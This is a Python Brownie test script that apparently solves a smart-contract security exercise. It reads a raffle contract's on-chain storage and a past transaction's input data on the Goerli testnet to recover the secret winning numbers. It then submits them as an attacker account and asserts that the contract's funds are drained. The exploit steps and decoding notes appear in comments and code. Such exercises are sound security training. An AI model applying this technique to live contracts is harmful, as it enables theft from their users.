import json
from web3 import Web3
from brownie import Contract
from brownie.convert import to_uint
from brownie import Wei, accounts


def test_sensitive_on_chain_data3():
    CRYPTIC_RAFFLE_ADDRESS = "0xca0B461f6F8Af197069a68f5f8A263b497569140"
    CRYPTIC_RAFFLE_ABI = json.loads(open('/Users/m4ud/Desktop/SCH/test/CrypticRaffle.json').read())  

    PARTICIPATION_PRICE = Wei('0.01 ether')

    [addictedGambler1, addictedGambler2, attacker] = accounts[:3]

    w3 = Web3(Web3.HTTPProvider())
    w3.provider.make_request("evm_setAccountBalance", [attacker.address, "0x16345785D8A0000"]) #  0.1 ETH

    attackerInitialBalance = attacker.balance()
    print("Attacker initial balance: ", to_uint(attackerInitialBalance), " ETH")

    # Load CrypticRaffle Contract
    crypticRaffle =Contract.from_abi("CrypticRaflle", CRYPTIC_RAFFLE_ADDRESS, CRYPTIC_RAFFLE_ABI)

    # addictedGambler1 is trying his strategy
    for _ in range(0, 100):
        numbers = [_, 20 + _, 100 - _]
        crypticRaffle.guessNumbers(numbers, {'from': addictedGambler1, 'gas_price': '1 gwei', 'value': PARTICIPATION_PRICE})

        # addictedGambler2 is trying his strategy
    for _ in range(0, 100):
        numbers = [_, 20 + _, 100 - _]
        crypticRaffle.guessNumbers(numbers, {'from': addictedGambler2, 'gas_price': '1 gwei',  'value': PARTICIPATION_PRICE})

    initialCrypticRaffleBalance = crypticRaffle.balance()
    print("Initial CrypticRaffle balance: ", to_uint(initialCrypticRaffleBalance), " ETH")
    
    """"  CODE YOUR SOLUTION HERE 



    #CMD: cast storage [contract] [slot] --rpc-url https://ethereum-goerli-rpc.allthatnode.com

    #Slot 0: 0x0000000000000000000000009cc6d4d0d1aac085ff54f254d206d9890f60338c (Owner)
    #Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000001 (Reentrnacy State Var)
    #Slot 2: 0x0000000000000000000000000000000000000000000000000000000000000001 (?)
    #Slot 3: 0x0000000000000000000000000000000000000000000000000000000000000004 (?)

    #0xc2847b3b - guessNumber sighash
    #0x3f5a9a5f - newRaffle sighash

    #Our Block Number: 8660077
    #Winning TX Block Number: 8660110

    #Winning transaction:
    #https://goerli.etherscan.io/tx/0xdb4b3952c434c2c6c0044a5c74e67219f21ecacb8f4ed1bfcd66d97be6cafece

    #Input data:
    #0xc2847b3b00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
    #[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

    #[HEX]  [DEC]
    #de --> 222
    #7e --> 126
    #47 --> 71

    #Deployed on block: 8655090

    #newRaffle trnasaciton (from the owner):
    #https://goerli.etherscan.io/tx/0xdab60e3d7187d9c10b32589a1801d4f6bd0b8830635c5051b9f9f5301fee9f90

    #Input data:
    #0x3f5a9a5f00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
    #[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]
    # """

    
    crypticRaffle.guessNumbers([222, 126, 71], {'from': attacker, 'gas_price': '1 gwei', 'value': PARTICIPATION_PRICE})

    # Check if the attacker won3 
    # No ETH in the cryptoRaffle contract
    currentCrypticRaffleBalance = crypticRaffle.balance()
    print("Current CrypticRaffle balance: ", to_uint(currentCrypticRaffleBalance), " ETH")
    assert(currentCrypticRaffleBalance == 0)

    # Attacker was able to guess the numbers and get all the ETH
    # - 0.1 ETH for transaction fees    
    currentAttackerBalance = attacker.balance()
    print("Attacker current balance: ", to_uint(currentAttackerBalance), " ETH")
    assert(currentAttackerBalance > attackerInitialBalance + initialCrypticRaffleBalance - int(Wei('0.1 ether')))